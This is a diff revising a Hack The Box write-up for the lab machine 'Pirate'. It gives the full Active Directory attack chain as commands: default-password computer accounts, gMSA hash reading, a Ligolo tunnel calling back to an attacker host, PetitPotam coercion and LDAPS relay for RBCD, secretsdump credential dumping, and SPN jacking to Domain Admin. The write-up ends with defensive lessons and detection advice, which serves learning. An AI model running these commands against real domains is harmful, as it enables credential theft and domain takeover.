@@ -5,7 +5,7 @@ difficulty: Hard
 platform: Hack The Box
 category: Machines
 state: Retired
-tags: [windows, active-directory, pre2k, gmsa, ligolo, petitpotam, rbcd, s4u2proxy]
+tags: [windows, active-directory, pre2k, gmsa, ligolo, petitpotam, rbcd, spn-jacking]
 ---
 
 # Pirate — Hack The Box
@@ -17,7 +17,7 @@ tags: [windows, active-directory, pre2k, gmsa, ligolo, petitpotam, rbcd, s4u2pro
 
 ## TL;DR
 
-A domain split across two segments. Entry is a **Pre-Windows 2000 computer account** whose password is the lowercase machine name (14 chars); from there you read a **gMSA** password, pivot with **Ligolo-ng**, coerce a secondary server with **PetitPotam** and relay that NTLM to **LDAPS** to write **RBCD**. Delegation over the web server plus **SPN jacking + S4U2Proxy** ends at Domain Admin.
+Start from *assumed breach* credentials (`pentest`). BloodHound shows **Domain Computers** inside **Pre-Windows 2000 Compatible Access**, so machine accounts created the legacy way still carry the default password (lowercase name): `MS01$:ms01` and `EXCH01$:exch01`. `MS01$` holds **ReadGMSAPassword** on `gMSA_ADFS_prod$`; that hash gives WinRM on the DC, which is a **Hyper-V host** fronting an internal network where **WEB01** lives (ADFS, NTLMv1 and WebClient). **PetitPotam** coercion plus **LDAPS** relay → **RBCD** → Administrator on WEB01 → `secretsdump` → `a.white` → `a.white_adm` with constrained delegation and **WriteSPN** → **SPN jacking** onto the DC → Domain Admin.
 
 ## Recon
 
@@ -29,78 +29,112 @@ nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389
 ```
 
-A DC with LDAP, Kerberos, SMB and WinRM. `nxc smb <IP>` returns the domain name; accounts whose `userAccountControl` carries the Pre-Windows 2000 flag are the entry point.
-
-## Initial access
-
 ```bash
-nxc smb <DC> -u 'guest' -p '' --rid-brute 3000
+nxc smb <IP> -u pentest -p '<password>' --shares
+bloodhound-python -dc dc01.pirate.htb -d pirate.htb -u pentest -p '<password>' -ns <IP> -c All --zip
 ```
 
-Host accounts `LEGACY01$` and `MS01$` show up. The legacy password is the lowercase hostname truncated to 14 characters:
+The DC is `DC01`, the domain `pirate.htb`, **SMB signing is on** but **LDAP signing is not enforced**: that is what makes the final relay possible.
+
+## Pre-Windows 2000
 
 ```bash
-impacket-getTGT '<domain>/MS01$:ms01' -dc-ip <DC>
-export KRB5CCNAME=ms01\$.ccache
+nxc ldap dc01.pirate.htb -u '' -p '' --pre2k
 ```
 
-That TGT can read the **gMSA** password, because the Pre-Windows 2000 group holds the read ACE:
+```text
+[+] MS01$:ms01
+[+] EXCH01$:exch01
+```
+
+These are computer accounts created through the compatibility path that never logged on, so their default password was never rotated.
+
+## gMSA
+
+BloodHound flags `MS01$` with **ReadGMSAPassword** on `gMSA_ADFS_prod$`:
 
 ```bash
-nxc ldap <DC> -k --use-kcache --gmsa
+nxc ldap dc01.pirate.htb -u 'MS01$' -p 'ms01' --gmsa
 ```
 
-It returns the service account NT hash, which already opens WinRM on the middle host.
+```text
+Account: gMSA_ADFS_prod$   NTLM: <hash>
+Account: gMSA_ADCS_prod$   NTLM: <hash>
+```
 
-## Pivot into the second segment
+```bash
+evil-winrm -i dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H '<hash>'
+```
+
+The gMSA has WinRM access to the DC and to WEB01.
+
+## Pivot into the internal network
+
+The DC doubles as a **Hyper-V** host with a second interface on `192.168.100.0/24`, where WEB01 sits.
 
 ```bash
 # attacker
-ip tuntap add user $USER mode tun ligolo && ip link set ligolo up
 ./proxy -selfcert
-
-# on the compromised host
-./agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
-# in the proxy: session -> start, then add the second segment route
+# on the DC
+.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
+# in the proxy: session -> start, then route to 192.168.100.0/24
 ```
 
 ```bash
-nmap -p- 172.16.7.0/24
+nmap -p- 192.168.100.2
 ```
 
-## RBCD through NTLM relay to LDAPS
+WEB01 is an **ADFS** server with **NTLMv1 enabled** and the **WebClient** service running: both conditions for coercion and relay.
 
-From the middle host, coerce the web server:
+## RBCD through coercion and relay
 
 ```bash
-python3 PetitPotam.py -u <user> -p <pass> -d <domain> <LISTENER_IP> <WEB_IP>
+python3 PetitPotam.py -u 'gMSA_ADFS_prod$' -p '<hash>' -hashes :<hash> \
+  -d pirate.htb <LISTENER_IP> 192.168.100.2
 ```
 
 ```bash
-ntlmrelayx.py -t ldaps://<DC> --delegate-access --escalate-user 'MS01$'
+ntlmrelayx.py -t ldaps://dc01.pirate.htb --delegate-access --remove-mic -smb2support
 ```
 
-The relay writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on the web host, so `MS01$` may delegate to it. Request a service ticket as Administrator:
+The relay writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on `WEB01$`. Request the ticket as Administrator:
 
 ```bash
-impacket-getST -spn cifs/<WEB> -impersonate Administrator -dc-ip <DC> '<domain>/MS01$:<hash>'
-export KRB5CCNAME=Administrator@cifs_web.ccache
+impacket-getST -spn cifs/web01.pirate.htb -impersonate Administrator \
+  -dc-ip dc01.pirate.htb 'pirate.htb/gMSA_ADFS_prod$:<hash>'
+export KRB5CCNAME=Administrator@cifs_web01.pirate.htb.ccache
+impacket-wmiexec -k -no-pass Administrator@web01.pirate.htb
 ```
 
-## Final hop with SPN jacking
-
-The same control over the account lets you write your own SPN and abuse `altservice`:
+## From WEB01 to Domain Admin
 
 ```bash
-Rubeus.exe s4u /user:MS01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<WEB> /altservice:ldap /ptt
+impacket-secretsdump -k -no-pass Administrator@web01.pirate.htb
 ```
 
-Copying the delegation onto the DC's `ldap`/`cifs` service reaches Domain Admin, and both flags are under `C:\Users\Administrator\Desktop\`.
+The dump yields cleartext credentials (AutoLogon/DefaultPassword) for **`a.white`**, who holds **ForceChangePassword** over **`a.white_adm`**:
+
+```bash
+bloodyAD -u a.white -p '<password>' -d pirate.htb --host dc01.pirate.htb \
+  set password a.white_adm '<NewPassword>!'
+```
+
+`a.white_adm` carries the two missing pieces: **constrained delegation** to `HTTP/WEB01` with protocol transition and **WriteSPN** on `WEB01$` and `DC01$`. That moves the delegated SPN onto the DC (**SPN jacking**) and requests a ticket for the controller itself:
+
+```bash
+impacket-getST -spn http/web01.pirate.htb -impersonate Administrator \
+  -dc-ip dc01.pirate.htb 'pirate.htb/a.white_adm:<NewPassword>!'
+# with the SPN rewritten to the DC, the ticket works for cifs/DC01
+impacket-secretsdump -k -no-pass Administrator@dc01.pirate.htb
+```
+
+The domain Administrator hash gives both flags.
 
 ## Lessons
 
-- Machine accounts with name-derived passwords still exist in old domains: hunt them and rotate them.
-- Reading a gMSA is effectively reading service credentials; the ACE belongs only on the host that uses it.
-- Coercion plus LDAPS relay still works when signing and channel binding are not enforced.
-- `WriteSPN` on an account that can delegate is full domain compromise: audit who may write `servicePrincipalName`.
-- Detection: outbound 445 from servers, anomalous NTLM auths to the DC, and creation of `msDS-AllowedToActOnBehalfOfOtherIdentity` objects.
+- Pre-Windows 2000 accounts with `logonCount=0` are free credentials; `nxc --pre2k` finds them in a minute.
+- Reading a gMSA is reading a service identity with WinRM: always review the `ReadGMSAPassword` ACE.
+- Coercion plus LDAPS relay stays alive while LDAP signing is not enforced.
+- `secretsdump` on a middle server usually yields cleartext credentials and, with them, the next hop.
+- `WriteSPN` on the DC combined with delegation is full domain control: the modern *SPN jacking*.
+- Detection: mass 4625s for machine accounts, LDAP reads of `msDS-ManagedPassword`, and creation of `msDS-AllowedToActOnBehalfOfOtherIdentity`.
